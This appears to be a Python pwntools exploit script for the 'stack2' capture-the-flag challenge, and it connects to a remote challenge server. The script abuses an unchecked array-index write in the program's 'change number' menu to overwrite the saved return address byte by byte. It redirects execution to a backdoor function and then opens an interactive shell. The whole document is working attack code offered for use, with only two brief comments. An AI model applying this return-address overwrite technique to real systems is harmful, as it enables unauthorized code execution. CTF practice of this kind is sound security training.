from pwn import *


# p = process("./stack2")
p = remote("node4.buuoj.cn", 26109)

back_door = 0x0804859B


p.sendlineafter("How many numbers you have:\n", "1")
p.sendlineafter("Give me your numbers\n", "2")

def change(index, num):
    p.sendlineafter("5. exit\n", "3")
    p.sendlineafter("which number to change:\n", str(index))
    p.sendlineafter("new number:\n", str(num))


# mov ecx, [ebp+var_4]; leave; lea esp, [ecx-4]; retn
# change ret addr to back_door
change(0x88-0x4, back_door & 0xff)
change(0x88-0x4+0x1, back_door >> 8 & 0xff)
change(0x88-0x4+0x2, back_door >> 16 & 0xff)
change(0x88-0x4+0x3, back_door >> 24 & 0xff)

# return to back_door
p.sendlineafter("5. exit\n", "5")

p.interactive()


